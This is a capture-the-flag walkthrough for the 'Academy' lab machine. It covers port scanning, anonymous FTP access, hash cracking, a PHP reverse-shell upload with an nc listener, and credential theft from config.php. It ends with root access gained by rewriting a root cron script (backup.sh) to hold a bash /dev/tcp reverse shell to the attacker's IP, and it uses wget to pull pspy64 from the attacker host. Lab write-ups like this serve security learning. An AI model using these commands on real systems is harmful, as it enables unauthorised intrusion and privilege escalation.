# Academy CTF – Full Walkthrough

This file contains a complete step-by-step guide to rooting the Academy CTF machine.

---

## 🔍 1. Reconnaissance

```bash
nmap -T4 -p- -A <target-ip>
```

### Open Ports:
- FTP (21)
- SSH (22)
- HTTP (80)

---

## 📂 2. FTP Enumeration

```bash
ftp <target-ip>
# Login: anonymous
```
- Found file: `note.txt`
- Contained a username and hashed password

---

## 🔓 3. Cracking the Hash

Used online tools like CrackStation to crack the password hash in `note.txt`.

---

## 🌐 4. Web Enumeration

```bash
ffuf -u http://<target-ip>/FUZZ -w /usr/share/wordlists/dirb/common.txt
```
- Found `/academy` portal
- Logged in using cracked credentials

---

## 🐚 5. File Upload Exploitation

Uploaded a PHP reverse shell via the web interface.

On attacker's machine:
```bash
nc -nlvp 1234
```

Got shell as `www-data`.

---

## 🧠 6. Enumeration and Privilege Escalation Prep

Located `config.php` under `/var/www/html/academy/includes/`.

```bash
cat config.php
```
- Found credentials for user `grimmie`.

---

## 🔑 7. SSH Access as grimmie

```bash
ssh grimmie@<target-ip>
```

---

## 🚀 8. Privilege Escalation via backup.sh

### Step 1: Confirmed `backup.sh` is executed as root via cron
Used pspy64:

```bash
wget http://<your-ip>/pspy64 -O /tmp/pspy64
chmod +x /tmp/pspy64
/tmp/pspy64
```

Saw this line:
```bash
CMD: UID=0    | /bin/bash /home/grimmie/backup.sh
```

### Step 2: Exploited it

On attacker's machine:
```bash
nc -nlvp 4444
```

On target (as grimmie):
```bash
echo '#!/bin/bash' > /home/grimmie/backup.sh
echo 'bash -c "bash -i >& /dev/tcp/(your IP ADDRESS)/4444 0>&1"' >> /home/grimmie/backup.sh
chmod +x /home/grimmie/backup.sh
```

After 1–2 minutes, received root shell.

---

## 🏁 9. Proof of Root

```bash
whoami
# root

cat /root/root.txt
```

---

> Created by Tejas Kottarshettar – CTF | VAPT | Red Team Learner
